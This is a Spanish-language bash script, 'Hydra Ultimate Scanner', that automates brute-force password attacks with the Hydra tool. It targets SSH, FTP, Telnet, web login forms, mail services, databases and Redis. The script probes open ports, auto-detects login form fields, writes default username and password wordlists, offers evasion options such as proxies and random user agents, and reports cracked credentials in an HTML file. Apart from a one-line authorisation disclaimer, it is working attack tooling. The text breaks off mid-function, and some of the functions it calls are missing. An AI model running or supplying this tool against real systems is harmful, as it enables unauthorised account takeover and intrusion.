#!/bin/bash

# 💀 HYDRA ULTIMATE SCANNER
# Máxima personalización para ataques de fuerza bruta con Hydra

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Variables globales
TARGET_IP=""
TARGET_URL=""
TARGET_SERVICE=""
USERNAME_LIST=""
PASSWORD_LIST=""
THREADS=""
OUTPUT_DIR=""
ATTACK_TYPE=""

print_banner() {
    clear
    echo -e "${RED}"
    echo "██╗  ██╗██╗   ██╗██████╗ ██████╗  █████╗     ██╗   ██╗██╗  ████████╗██╗███╗   ███╗ █████╗ ████████╗███████╗"
    echo "██║  ██║╚██╗ ██╔╝██╔══██╗██╔══██╗██╔══██╗    ██║   ██║██║  ╚══██╔══╝██║████╗ ████║██╔══██╗╚══██╔══╝██╔════╝"
    echo "███████║ ╚████╔╝ ██║  ██║██████╔╝███████║    ██║   ██║██║     ██║   ██║██╔████╔██║███████║   ██║   █████╗  "
    echo "██╔══██║  ╚██╔╝  ██║  ██║██╔══██╗██╔══██║    ██║   ██║██║     ██║   ██║██║╚██╔╝██║██╔══██║   ██║   ██╔══╝  "
    echo "██║  ██║   ██║   ██████╔╝██║  ██║██║  ██║    ╚██████╔╝███████╗██║   ██║██║ ╚═╝ ██║██║  ██║   ██║   ███████╗"
    echo "╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝     ╚═════╝ ╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝"
    echo -e "${NC}"
    echo -e "${CYAN}💀 Hydra Ultimate Scanner - Fuerza Bruta Multi-Servicio${NC}"
    echo -e "${YELLOW}⚠️  Solo usar en sistemas propios o con autorización explícita${NC}"
    echo ""
}

select_target() {
    echo -e "\n${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}         ${YELLOW}SELECCIÓN DE OBJETIVO${NC}          ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
    
    echo -e "${YELLOW}¿Qué tipo de objetivo tienes?${NC}"
    echo -e "  ${CYAN}1.${NC} 🖥️ Servidor específico ${PURPLE}[IP/hostname]${NC}"
    echo -e "  ${CYAN}2.${NC} 🌐 Sitio web/aplicación web"
    echo -e "  ${CYAN}3.${NC} 🔍 Escanear red local para objetivos"
    echo -e "  ${CYAN}4.${NC} 📋 Lista de objetivos múltiples"
    echo ""
    
    read -p "Selecciona tipo (1-4): " target_choice
    
    case $target_choice in
        1)
            read -p "🎯 IP o hostname del objetivo: " TARGET_IP
            ;;
        2)
            read -p "🌐 URL del sitio web: " TARGET_URL
            # Extraer IP/hostname de URL
            TARGET_IP=$(echo "$TARGET_URL" | sed 's/https\?:\/\///' | cut -d'/' -f1 | cut -d':' -f1)
            ;;
        3)
            scan_local_network_for_targets
            ;;
        4)
            create_multiple_targets_list
            ;;
        *)
            read -p "🎯 IP del objetivo: " TARGET_IP
            ;;
    esac
    
    if [[ -n "$TARGET_IP" ]]; then
        echo -e "${GREEN}✅ Objetivo configurado: $TARGET_IP${NC}"
        
        # Verificar conectividad
        verify_target_connectivity
    fi
}

verify_target_connectivity() {
    echo -e "${CYAN}🔍 Verificando conectividad con $TARGET_IP...${NC}"
    
    if ping -c 3 -W 2 "$TARGET_IP" >/dev/null 2>&1; then
        echo -e "${GREEN}✅ Objetivo accesible${NC}"
        
        # Escaneo rápido de puertos
        echo -e "${CYAN}📊 Escaneando puertos comunes...${NC}"
        scan_common_ports
    else
        echo -e "${YELLOW}⚠️ No hay respuesta a ping (puede estar filtrado)${NC}"
        read -p "¿Continuar de todos modos? (y/N): " continue_anyway
        [[ $continue_anyway != [yY] ]] && return 1
    fi
}

scan_common_ports() {
    # Puertos comunes para servicios que hydra puede atacar
    local common_ports=(21 22 23 25 53 80 110 143 443 993 995 1433 3306 5432 6379)
    local open_ports=()
    
    for port in "${common_ports[@]}"; do
        if timeout 2 bash -c "echo >/dev/tcp/$TARGET_IP/$port" 2>/dev/null; then
            open_ports+=("$port")
        fi
    done
    
    if [[ ${#open_ports[@]} -gt 0 ]]; then
        echo -e "${GREEN}🔓 Puertos abiertos encontrados: ${open_ports[*]}${NC}"
        
        # Sugerir servicios
        suggest_services_from_ports "${open_ports[@]}"
    else
        echo -e "${YELLOW}⚠️ No se detectaron puertos abiertos comunes${NC}"
    fi
}

suggest_services_from_ports() {
    local ports=("$@")
    
    echo -e "\n${CYAN}💡 Servicios potenciales detectados:${NC}"
    
    for port in "${ports[@]}"; do
        case $port in
            21) echo -e "  🗂️ Puerto 21: FTP" ;;
            22) echo -e "  🔐 Puerto 22: SSH" ;;
            23) echo -e "  📟 Puerto 23: Telnet" ;;
            25) echo -e "  📧 Puerto 25: SMTP" ;;
            80) echo -e "  🌐 Puerto 80: HTTP" ;;
            110) echo -e "  📬 Puerto 110: POP3" ;;
            143) echo -e "  📮 Puerto 143: IMAP" ;;
            443) echo -e "  🔒 Puerto 443: HTTPS" ;;
            1433) echo -e "  🗃️ Puerto 1433: MS SQL Server" ;;
            3306) echo -e "  🐬 Puerto 3306: MySQL" ;;
            5432) echo -e "  🐘 Puerto 5432: PostgreSQL" ;;
            6379) echo -e "  🔴 Puerto 6379: Redis" ;;
        esac
    done
}

select_service() {
    echo -e "\n${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}        ${YELLOW}SELECCIÓN DE SERVICIO${NC}          ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
    
    echo -e "${YELLOW}¿Qué servicio quieres atacar?${NC}"
    echo -e "  ${CYAN}1.${NC} 🔐 SSH ${PURPLE}[Puerto 22]${NC}"
    echo -e "  ${CYAN}2.${NC} 🗂️ FTP ${PURPLE}[Puerto 21]${NC}"
    echo -e "  ${CYAN}3.${NC} 📟 Telnet ${PURPLE}[Puerto 23]${NC}"
    echo -e "  ${CYAN}4.${NC} 🌐 HTTP/HTTPS Login ${PURPLE}[Formularios web]${NC}"
    echo -e "  ${CYAN}5.${NC} 📧 SMTP ${PURPLE}[Email auth]${NC}"
    echo -e "  ${CYAN}6.${NC} 📬 POP3/IMAP ${PURPLE}[Email protocols]${NC}"
    echo -e "  ${CYAN}7.${NC} 🗃️ Base de datos ${PURPLE}[MySQL, PostgreSQL, MSSQL]${NC}"
    echo -e "  ${CYAN}8.${NC} 🔴 Redis ${PURPLE}[Key-value store]${NC}"
    echo -e "  ${CYAN}9.${NC} 🔧 Servicio personalizado"
    echo ""
    
    read -p "Selecciona servicio (1-9): " service_choice
    
    case $service_choice in
        1) 
            TARGET_SERVICE="ssh"
            configure_ssh_attack
            ;;
        2) 
            TARGET_SERVICE="ftp"
            configure_ftp_attack
            ;;
        3) 
            TARGET_SERVICE="telnet"
            configure_telnet_attack
            ;;
        4) 
            configure_http_attack
            ;;
        5) 
            TARGET_SERVICE="smtp"
            configure_smtp_attack
            ;;
        6) 
            configure_email_attack
            ;;
        7) 
            configure_database_attack
            ;;
        8) 
            TARGET_SERVICE="redis"
            configure_redis_attack
            ;;
        9) 
            configure_custom_service
            ;;
        *)
            echo -e "${YELLOW}Configurando SSH por defecto${NC}"
            TARGET_SERVICE="ssh"
            configure_ssh_attack
            ;;
    esac
}

configure_ssh_attack() {
    echo -e "\n${CYAN}🔐 Configuración de ataque SSH:${NC}"
    
    # Puerto personalizado
    read -p "📊 Puerto SSH (default 22): " ssh_port
    ssh_port=${ssh_port:-22}
    
    # Configuraciones específicas SSH
    read -p "🔑 Intentar autenticación por clave? (y/N): " try_key_auth
    read -p "⏱️ Timeout por intento (segundos, default 30): " ssh_timeout
    ssh_timeout=${ssh_timeout:-30}
    
    # Guardar configuración SSH específica
    cat > "/tmp/ssh_config" << EOF
SSH_PORT=$ssh_port
TRY_KEY_AUTH=$try_key_auth
SSH_TIMEOUT=$ssh_timeout
EOF
    
    echo -e "${GREEN}✅ SSH configurado en puerto $ssh_port${NC}"
}

configure_ftp_attack() {
    echo -e "\n${CYAN}🗂️ Configuración de ataque FTP:${NC}"
    
    read -p "📊 Puerto FTP (default 21): " ftp_port
    ftp_port=${ftp_port:-21}
    
    read -p "🔒 FTP sobre SSL/TLS? (y/N): " ftp_ssl
    
    if [[ "$ftp_ssl" == [yY]* ]]; then
        TARGET_SERVICE="ftps"
    fi
    
    echo -e "${GREEN}✅ FTP configurado en puerto $ftp_port${NC}"
}

configure_http_attack() {
    echo -e "\n${CYAN}🌐 Configuración de ataque HTTP/HTTPS:${NC}"
    
    echo -e "${YELLOW}¿Qué tipo de autenticación web atacar?${NC}"
    echo -e "  ${CYAN}1.${NC} 📝 Formulario de login ${PURPLE}[POST]${NC}"
    echo -e "  ${CYAN}2.${NC} 🔐 HTTP Basic Auth ${PURPLE}[401]${NC}"
    echo -e "  ${CYAN}3.${NC} 🎭 HTTP Digest Auth"
    echo -e "  ${CYAN}4.${NC} 🔧 Personalizado"
    
    read -p "Tipo de auth (1-4): " http_type
    
    case $http_type in
        1) configure_form_attack ;;
        2) 
            TARGET_SERVICE="http-get"
            configure_basic_auth
            ;;
        3) 
            TARGET_SERVICE="http-digest"
            configure_basic_auth
            ;;
        4) configure_custom_http ;;
    esac
}

configure_form_attack() {
    TARGET_SERVICE="http-form-post"
    
    echo -e "\n${CYAN}📝 Configuración de formulario web:${NC}"
    
    # URL del formulario
    read -p "🔗 URL del formulario de login: " form_url
    if [[ -z "$form_url" ]]; then
        form_url="/"
    fi
    
    # Detectar campos del formulario automáticamente
    echo -e "${CYAN}🔍 ¿Quieres detectar campos automáticamente?${NC}"
    read -p "Detectar auto? (Y/n): " auto_detect
    
    if [[ "$auto_detect" != [nN]* ]]; then
        detect_form_fields "$form_url"
    else
        configure_form_fields_manual
    fi
}

detect_form_fields() {
    local url="$1"
    local full_url=""
    
    if [[ "$url" == http* ]]; then
        full_url="$url"
    else
        full_url="http://$TARGET_IP$url"
    fi
    
    echo -e "${CYAN}🔍 Detectando campos del formulario...${NC}"
    
    # Intentar obtener el formulario con curl
    local form_html=$(curl -s --max-time 10 "$full_url" 2>/dev/null)
    
    if [[ -n "$form_html" ]]; then
        # Buscar campos de usuario y contraseña
        local user_field=$(echo "$form_html" | grep -oE 'name=["\'"'"'][^"'"'"']*["\'"'"']' | grep -iE '(user|login|email|username)' | head -1 | sed 's/name=//g' | tr -d '"'"'"')
        local pass_field=$(echo "$form_html" | grep -oE 'name=["\'"'"'][^"'"'"']*["\'"'"']' | grep -iE '(pass|password|pwd)' | head -1 | sed 's/name=//g' | tr -d '"'"'"')
        
        if [[ -n "$user_field" && -n "$pass_field" ]]; then
            echo -e "${GREEN}✅ Campos detectados automáticamente:${NC}"
            echo -e "  👤 Usuario: ${CYAN}$user_field${NC}"
            echo -e "  🔑 Contraseña: ${CYAN}$pass_field${NC}"
            
            # Configurar hydra con campos detectados
            HTTP_FORM_PATH="$url"
            HTTP_USER_FIELD="$user_field"
            HTTP_PASS_FIELD="$pass_field"
            
            # Mensaje de error
            read -p "❌ Mensaje de error en login fallido: " error_message
            HTTP_ERROR_MESSAGE="$error_message"
            
        else
            echo -e "${YELLOW}⚠️ No se pudieron detectar campos automáticamente${NC}"
            configure_form_fields_manual
        fi
    else
        echo -e "${YELLOW}⚠️ No se pudo acceder al formulario${NC}"
        configure_form_fields_manual
    fi
}

configure_form_fields_manual() {
    echo -e "\n${CYAN}📝 Configuración manual del formulario:${NC}"
    
    read -p "🔗 Ruta del formulario (ej: /login): " HTTP_FORM_PATH
    read -p "👤 Nombre del campo usuario: " HTTP_USER_FIELD
    read -p "🔑 Nombre del campo contraseña: " HTTP_PASS_FIELD
    read -p "❌ Mensaje de error en fallo: " HTTP_ERROR_MESSAGE
    
    # Campos adicionales opcionales
    read -p "🔧 Campos adicionales (ej: csrf_token=xyz): " additional_fields
    HTTP_ADDITIONAL_FIELDS="$additional_fields"
}

configure_username_strategy() {
    echo -e "\n${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}       ${YELLOW}ESTRATEGIA DE USUARIOS${NC}          ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
    
    echo -e "${YELLOW}¿Cómo quieres obtener la lista de usuarios?${NC}"
    echo -e "  ${CYAN}1.${NC} 📚 Lista predefinida ${PURPLE}[usuarios comunes]${NC}"
    echo -e "  ${CYAN}2.${NC} 👤 Usuario específico"
    echo -e "  ${CYAN}3.${NC} 📁 Cargar desde archivo"
    echo -e "  ${CYAN}4.${NC} 🔍 Enumerar usuarios automáticamente"
    echo -e "  ${CYAN}5.${NC} 🎯 Generar lista personalizada"
    echo ""
    
    read -p "Selecciona estrategia (1-5): " user_strategy
    
    case $user_strategy in
        1) select_predefined_usernames ;;
        2) configure_single_username ;;
        3) load_username_file ;;
        4) enumerate_usernames ;;
        5) generate_custom_usernames ;;
        *) select_predefined_usernames ;;
    esac
}

select_predefined_usernames() {
    local output_file="$OUTPUT_DIR/wordlists/common_usernames.txt"
    mkdir -p "$(dirname "$output_file")"
    
    echo -e "\n${CYAN}📚 Generando lista de usuarios comunes...${NC}"
    
    # Lista de usuarios comunes según el servicio
    case $TARGET_SERVICE in
        ssh|ftp|telnet)
            cat > "$output_file" << 'EOF'
root
admin
administrator
user
guest
test
oracle
postgres
mysql
ftp
www
www-data
apache
nginx
tomcat
jenkins
git
ubuntu
centos
debian
redhat
pi
kali
EOF
            ;;
        http*)
            cat > "$output_file" << 'EOF'
admin
administrator
root
user
guest
test
demo
webmaster
operator
manager
support
service
portal
api
system
public
anonymous
EOF
            ;;
        smtp|pop3|imap)
            cat > "$output_file" << 'EOF'
admin
administrator
postmaster
root
webmaster
info
support
noreply
no-reply
contact
sales
help
EOF
            ;;
        *)
            cat > "$output_file" << 'EOF'
admin
administrator
root
user
guest
test
demo
service
system
operator
manager
support
EOF
            ;;
    esac
    
    local user_count=$(wc -l < "$output_file")
    echo -e "${GREEN}✅ Lista de usuarios comunes creada: $user_count usuarios${NC}"
    
    USERNAME_LIST="$output_file"
}

configure_single_username() {
    read -p "👤 Usuario específico: " single_user
    
    local output_file="$OUTPUT_DIR/wordlists/single_username.txt"
    mkdir -p "$(dirname "$output_file")"
    
    echo "$single_user" > "$output_file"
    USERNAME_LIST="$output_file"
    
    echo -e "${GREEN}✅ Usuario configurado: $single_user${NC}"
}

configure_password_strategy() {
    echo -e "\n${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}      ${YELLOW}ESTRATEGIA DE CONTRASEÑAS${NC}       ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
    
    echo -e "${YELLOW}¿Qué estrategia de contraseñas usar?${NC}"
    echo -e "  ${CYAN}1.${NC} 🔥 Lista TOP más comunes ${PURPLE}[rockyou, darkweb2017]${NC}"
    echo -e "  ${CYAN}2.${NC} 🎯 Contraseñas por defecto del servicio"
    echo -e "  ${CYAN}3.${NC} 📁 Cargar wordlist personalizada"
    echo -e "  ${CYAN}4.${NC} 🔢 Generar contraseñas numéricas"
    echo -e "  ${CYAN}5.${NC} 🌐 Contraseñas específicas para web"
    echo -e "  ${CYAN}6.${NC} 🔀 Combinar múltiples estrategias"
    echo ""
    
    read -p "Selecciona estrategia (1-6): " pass_strategy
    
    case $pass_strategy in
        1) select_common_passwords ;;
        2) generate_service_default_passwords ;;
        3) load_custom_password_file ;;
        4) generate_numeric_passwords ;;
        5) generate_web_passwords ;;
        6) combine_password_strategies ;;
        *) select_common_passwords ;;
    esac
}

generate_service_default_passwords() {
    local output_file="$OUTPUT_DIR/wordlists/service_defaults.txt"
    mkdir -p "$(dirname "$output_file")"
    
    echo -e "\n${CYAN}🎯 Generando contraseñas por defecto para $TARGET_SERVICE...${NC}"
    
    case $TARGET_SERVICE in
        ssh|ftp|telnet)
            cat > "$output_file" << 'EOF'
password
123456
admin
root
guest
test
changeme
default
welcome
login
qwerty
abc123
Password1
admin123
root123
12345678
1234567890
password123
administrator
EOF
            ;;
        http*|https*)
            cat > "$output_file" << 'EOF'
admin
password
123456
admin123
administrator
welcome
changeme
default
portal
system
manager
webadmin
Password1
12345
qwerty
login
demo
test123
password123
EOF
            ;;
        mysql)
            cat > "$output_file" << 'EOF'
root
password
mysql
admin
123456
changeme
default
welcome
database
db
sql
Password1
mysql123
admin123
root123
EOF
            ;;
        postgres|postgresql)
            cat > "$output_file" << 'EOF'
postgres
password
admin
123456
changeme
default
welcome
database
postgresql
postgres123
admin123
Password1
root
EOF
            ;;
        *)
            cat > "$output_file" << 'EOF'
password
admin
123456
default
changeme
welcome
guest
test
Password1
admin123
12345
qwerty
EOF
            ;;
    esac
    
    local pass_count=$(wc -l < "$output_file")
    echo -e "${GREEN}✅ Contraseñas por defecto generadas: $pass_count${NC}"
    
    PASSWORD_LIST="$output_file"
}

configure_attack_parameters() {
    echo -e "\n${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}      ${YELLOW}PARÁMETROS DE ATAQUE${NC}           ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
    
    # Configuración de hilos
    echo -e "${CYAN}🔧 Configuración de rendimiento:${NC}"
    read -p "🧵 Número de hilos paralelos (default 16): " THREADS
    THREADS=${THREADS:-16}
    
    # Configuración de timing
    read -p "⏱️ Delay entre intentos (ms, default 0): " delay
    delay=${delay:-0}
    
    read -p "⏰ Timeout por intento (s, default 30): " timeout
    timeout=${timeout:-30}
    
    # Configuración de evasión
    echo -e "\n${CYAN}🥷 Opciones de evasión:${NC}"
    read -p "🔀 Randomizar orden de usuarios? (Y/n): " randomize_users
    read -p "🎭 Usar user-agents aleatorios? (y/N): " random_ua
    read -p "🌐 Usar proxies? (y/N): " use_proxies
    
    # Configuración avanzada
    echo -e "\n${CYAN}⚙️ Configuración avanzada:${NC}"
    read -p "🔄 Continuar en caso de bloqueo? (Y/n): " continue_on_error
    read -p "💾 Guardar intentos exitosos en archivo? (Y/n): " save_found
    read -p "📊 Mostrar intentos en tiempo real? (Y/n): " verbose_output
    
    echo -e "${GREEN}✅ Parámetros configurados:${NC}"
    echo -e "  🧵 Hilos: ${CYAN}$THREADS${NC}"
    echo -e "  ⏱️ Delay: ${CYAN}${delay}ms${NC}"
    echo -e "  ⏰ Timeout: ${CYAN}${timeout}s${NC}"
}

execute_hydra_attack() {
    echo -e "\n${YELLOW}💀 Iniciando ataque Hydra...${NC}"
    
    if [[ ! -f "$USERNAME_LIST" || ! -f "$PASSWORD_LIST" ]]; then
        echo -e "${RED}❌ Listas de usuarios o contraseñas no configuradas${NC}"
        return 1
    fi
    
    local hydra_cmd="hydra"
    local output_file="$OUTPUT_DIR/results/hydra_results.txt"
    local log_file="$OUTPUT_DIR/logs/hydra_attack.log"
    
    # Configurar parámetros básicos
    hydra_cmd="$hydra_cmd -L '$USERNAME_LIST' -P '$PASSWORD_LIST'"
    hydra_cmd="$hydra_cmd -t $THREADS"
    hydra_cmd="$hydra_cmd -o '$output_file'"
    
    # Configuraciones específicas del servicio
    configure_service_specific_params
    
    # Configuraciones avanzadas
    [[ "$randomize_users" != [nN]* ]] && hydra_cmd="$hydra_cmd -u"
    [[ "$continue_on_error" != [nN]* ]] && hydra_cmd="$hydra_cmd -f"
    [[ "$verbose_output" != [nN]* ]] && hydra_cmd="$hydra_cmd -V"
    
    # Objetivo y servicio
    case $TARGET_SERVICE in
        http-form-post)
            hydra_cmd="$hydra_cmd '$TARGET_IP' http-form-post"
            hydra_cmd="$hydra_cmd '$HTTP_FORM_PATH:$HTTP_USER_FIELD=^USER^&$HTTP_PASS_FIELD=^PASS^:$HTTP_ERROR_MESSAGE'"
            ;;
        http-get|http-digest)
            hydra_cmd="$hydra_cmd '$TARGET_IP' $TARGET_SERVICE"
            ;;
        *)
            hydra_cmd="$hydra_cmd '$TARGET_IP' $TARGET_SERVICE"
            ;;
    esac
    
    echo -e "${CYAN}🎯 Configuración del ataque:${NC}"
    echo -e "  🏠 Objetivo: ${CYAN}$TARGET_IP${NC}"
    echo -e "  🔧 Servicio: ${CYAN}$TARGET_SERVICE${NC}"
    echo -e "  👥 Usuarios: ${CYAN}$(wc -l < "$USERNAME_LIST")${NC}"
    echo -e "  🔑 Contraseñas: ${CYAN}$(wc -l < "$PASSWORD_LIST")${NC}"
    echo -e "  🧵 Hilos: ${CYAN}$THREADS${NC}"
    
    echo -e "\n${BLUE}Comando completo:${NC}"
    echo -e "${YELLOW}$hydra_cmd${NC}"
    
    echo -e "\n${YELLOW}🚀 Ejecutando ataque...${NC}"
    echo -e "${CYAN}⏳ Esto puede tomar tiempo según el tamaño de las listas${NC}"
    
    # Crear directorios
    mkdir -p "$(dirname "$output_file")" "$(dirname "$log_file")"
    
    # Ejecutar hydra y mostrar progreso
    {
        echo "=== HYDRA ATTACK LOG - $(date) ==="
        echo "Target: $TARGET_IP"
        echo "Service: $TARGET_SERVICE"
        echo "Command: $hydra_cmd"
        echo "Started: $(date)"
        echo ""
    } > "$log_file"
    
    # Ejecutar hydra con logging
    eval "$hydra_cmd" 2>&1 | tee -a "$log_file"
    
    # Analizar resultados
    analyze_hydra_results "$output_file" "$log_file"
}

configure_service_specific_params() {
    case $TARGET_SERVICE in
        ssh)
            # Configuración SSH específica
            if [[ -f "/tmp/ssh_config" ]]; then
                source "/tmp/ssh_config"
                [[ -n "$SSH_PORT" && "$SSH_PORT" != "22" ]] && hydra_cmd="$hydra_cmd -s $SSH_PORT"
            fi
            ;;
        ftp)
            # Configuración FTP específica
            ;;
        mysql)
            # Puerto MySQL por defecto
            hydra_cmd="$hydra_cmd -s 3306"
            ;;
        postgres)
            # Puerto PostgreSQL por defecto
            hydra_cmd="$hydra_cmd -s 5432"
            ;;
    esac
}

analyze_hydra_results() {
    local output_file="$1"
    local log_file="$2"
    
    echo -e "\n${CYAN}📊 Analizando resultados...${NC}"
    
    # Buscar credenciales encontradas
    local found_creds=()
    
    if [[ -f "$output_file" && -s "$output_file" ]]; then
        while IFS= read -r line; do
            found_creds+=("$line")
        done < "$output_file"
    fi
    
    # También buscar en el log
    local log_creds=$(grep -E "\[.*\]\[.*\] host:" "$log_file" 2>/dev/null)
    
    if [[ ${#found_creds[@]} -gt 0 || -n "$log_creds" ]]; then
        echo -e "${GREEN}🎉 ¡CREDENCIALES ENCONTRADAS!${NC}"
        
        # Mostrar credenciales del archivo
        if [[ ${#found_creds[@]} -gt 0 ]]; then
            echo -e "\n${YELLOW}📄 Desde archivo de resultados:${NC}"
            for cred in "${found_creds[@]}"; do
                echo -e "  🔑 $cred"
            done
        fi
        
        # Mostrar credenciales del log
        if [[ -n "$log_creds" ]]; then
            echo -e "\n${YELLOW}📋 Desde log detallado:${NC}"
            echo "$log_creds" | while read -r line; do
                echo -e "  🔑 $line"
            done
        fi
        
        # Crear reporte de éxito
        create_success_report_hydra
        
    else
        echo -e "${YELLOW}❌ No se encontraron credenciales válidas${NC}"
        
        # Analizar por qué falló
        analyze_failure_reasons "$log_file"
    fi
    
    # Estadísticas generales
    show_attack_statistics "$log_file"
}

analyze_failure_reasons() {
    local log_file="$1"
    
    echo -e "\n${CYAN}🔍 Analizando posibles causas del fallo:${NC}"
    
    # Buscar errores comunes
    if grep -q "Connection refused" "$log_file"; then
        echo -e "  ❌ ${RED}Conexión rechazada${NC} - El servicio puede estar inactivo"
    fi
    
    if grep -q "too many connections" "$log_file"; then
        echo -e "  ❌ ${RED}Demasiadas conexiones${NC} - Reduce el número de hilos"
    fi
    
    if grep -q "timeout" "$log_file"; then
        echo -e "  ❌ ${RED}Timeouts detectados${NC} - Aumenta el timeout o reduce hilos"
    fi
    
    if grep -q "blocked" "$log_file"; then
        echo -e "  ❌ ${RED}IP bloqueada${NC} - Usa proxies o espera antes de reintentar"
    fi
    
    # Mostrar total de intentos
    local total_attempts=$(grep -c "attempt" "$log_file" 2>/dev/null || echo "0")
    echo -e "  📊 Total de intentos: ${CYAN}$total_attempts${NC}"
}

show_attack_statistics() {
    local log_file="$1"
    
    echo -e "\n${CYAN}📈 Estadísticas del ataque:${NC}"
    
    # Tiempo de ejecución
    local start_time=$(grep "Started:" "$log_file" | cut -d':' -f2-)
    local end_time=$(date)
    echo -e "  ⏰ Iniciado: ${CYAN}$start_time${NC}"
    echo -e "  🏁 Finalizado: ${CYAN}$end_time${NC}"
    
    # Estadísticas de conexión
    local attempts=$(grep -c "attempt" "$log_file" 2>/dev/null || echo "0")
    local errors=$(grep -c "error\|ERROR\|failed" "$log_file" 2>/dev/null || echo "0")
    
    echo -e "  📊 Total intentos: ${CYAN}$attempts${NC}"
    echo -e "  ❌ Errores: ${CYAN}$errors${NC}"
    
    # Calcular rate
    if [[ $attempts -gt 0 ]]; then
        local success_rate=$(( (attempts - errors) * 100 / attempts ))
        echo -e "  ✅ Tasa de éxito conexión: ${CYAN}${success_rate}%${NC}"
    fi
}

create_success_report_hydra() {
    local report_file="$OUTPUT_DIR/reports/hydra_success.html"
    mkdir -p "$(dirname "$report_file")"
    
    cat > "$report_file" << EOF
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Hydra Attack Success</title>
    <style>
        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%); margin: 0; padding: 20px; }
        .container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
        .header { text-align: center; margin-bottom: 30px; }
        .success { background: #d4edda; border: 1px solid #c3e6cb; color: #155724; padding: 15px; border-radius: 5px; margin: 20px 0; }
        .credentials { background: #f8f9fa; border: 2px solid #dc3545; padding: 20px; border-radius: 10px; font-family: monospace; margin: 20px 0; }
        .details { background: #f8f9fa; padding: 15px; border-radius: 5px; margin: 10px 0; }
        .label { font-weight: bold; color: #495057; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>💀 Hydra Attack Success</h1>
        </div>
        
        <div class="success">
            <h2>🎯 Credenciales Encontradas</h2>
            <p>El ataque de fuerza bruta ha sido exitoso.</p>
        </div>
        
        <div class="credentials">
            <h3>🔑 Credenciales Válidas:</h3>
EOF
    
    # Agregar credenciales encontradas
    if [[ -f "$OUTPUT_DIR/results/hydra_results.txt" ]]; then
        while IFS= read -r line; do
            echo "            <p><strong>$line</strong></p>" >> "$report_file"
        done < "$OUTPUT_DIR/results/hydra_results.txt"
    fi
    
    cat >> "$report_file" << EOF
        </div>
        
        <div class="details">
            <span class="label">🎯 Objetivo:</span> $TARGET_IP<br>
            <span class="label">🔧 Servicio:</span> $TARGET_SERVICE<br>
            <span class="label">👥 Usuarios probados:</span> $(wc -l < "$USERNAME_LIST" 2>/dev/null || echo "N/A")<br>
            <span class="label">🔑 Contraseñas probadas:</span> $(wc -l < "$PASSWORD_LIST" 2>/dev/null || echo "N/A")<br>
            <span class="label">📅 Fecha:</span> $(date)<br>
        </div>
    </div>
</body>
</html>
EOF
    
    echo -e "${CYAN}📊 Reporte HTML creado: $report_file${NC}"
}

setup_output_directory() {
    OUTPUT_DIR="hydra_attack_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$OUTPUT_DIR"/{logs,results,reports,wordlists}
    
    echo -e "${GREEN}📁 Directorio creado: $OUTPUT_DIR${NC}"
    
    # Crear archivo de información
    cat > "$OUTPUT_DIR/attack_info.txt" << EOF
# Hydra Attack Session - $(date)
Target IP: $TARGET_IP
Target URL: $TARGET_URL
Service: $TARGET_SERVICE
Username List: $USERNAME_LIST
Password List: $PASSWORD_LIST
Threads: $THREADS
Started: $(date)
EOF
}

show_hydra_summary() {
    echo -e "\n${BLUE}╔════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}                    ${YELLOW}RESUMEN ATAQUE HYDRA${NC}                          ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════════════════════════════════════════╝${NC}"
    
    echo -e "${CYAN}📁 Directorio del proyecto: $OUTPUT_DIR${NC}"
    
    if [[ -n "$TARGET_IP" ]]; then
        echo -e "\n${GREEN}🎯 Objetivo atacado:${NC}"
        echo -e "  🏠 IP/Host: $TARGET_IP"
        echo -e "  🔧 Servicio: $TARGET_SERVICE"
        echo -e "  🧵 Hilos usados: $THREADS"
    fi
    
    # Verificar resultados
    local results_file="$OUTPUT_DIR/results/hydra_results.txt"
    if [[ -f "$results_file" && -s "$results_file" ]]; then
        echo -e "\n${GREEN}🎉 ¡CREDENCIALES ENCONTRADAS!${NC}"
        echo -e "${YELLOW}🔑 Credenciales válidas:${NC}"
        cat "$results_file" | while read -r line; do
            echo -e "  • $line"
        done
    else
        echo -e "\n${YELLOW}❌ No se encontraron credenciales${NC}"
    fi
    
    # Mostrar estadísticas
    if [[ -f "$USERNAME_LIST" && -f "$PASSWORD_LIST" ]]; then
        local total_combinations=$(( $(wc -l < "$USERNAME_LIST") * $(wc -l < "$PASSWORD_LIST") ))
        echo -e "\n${CYAN}📊 Estadísticas:${NC}"
        echo -e "  👥 Usuarios probados: $(wc -l < "$USERNAME_LIST")"
        echo -e "  🔑 Contraseñas probadas: $(wc -l < "$PASSWORD_LIST")"
        echo -e "  🎯 Combinaciones totales: $total_combinations"
    fi
    
    echo -e "\n${CYAN}📁 Archivos generados:${NC}"
    find "$OUTPUT_DIR" -type f 2>/dev/null | while read file; do
        local size=$(du -h "$file" 2>/dev/null | cut -f1)
        local rel_path=${file#$OUTPUT_DIR/}
        echo -e "  📄 $rel_path ($size)"
    done
}

main_menu() {
    while true; do
        print_banner
        
